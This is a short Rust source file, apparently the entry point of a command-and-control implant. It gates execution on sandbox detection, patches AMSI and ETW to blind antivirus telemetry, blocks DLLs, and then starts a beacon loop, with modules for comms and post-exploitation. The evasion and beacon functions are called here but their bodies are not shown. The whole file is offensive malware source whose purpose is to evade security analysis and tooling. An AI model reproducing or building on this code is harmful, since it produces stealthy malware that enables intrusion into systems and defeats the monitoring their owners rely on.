mod beacon;
mod comms;
mod config;
mod evasion;
mod postex;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cfg = config::load();

    // Sandbox detection — exit cleanly if analysis environment detected
    if cfg.sandbox_evasion && evasion::is_sandbox() {
        return Ok(());
    }

    // Apply process mitigations
    evasion::harden(cfg.block_dlls);

    // Bypass AV telemetry hooks
    if cfg.amsi_bypass { evasion::amsi::patch(); }
    if cfg.etw_bypass  { evasion::etw::patch();  }

    beacon::run(cfg).await
}
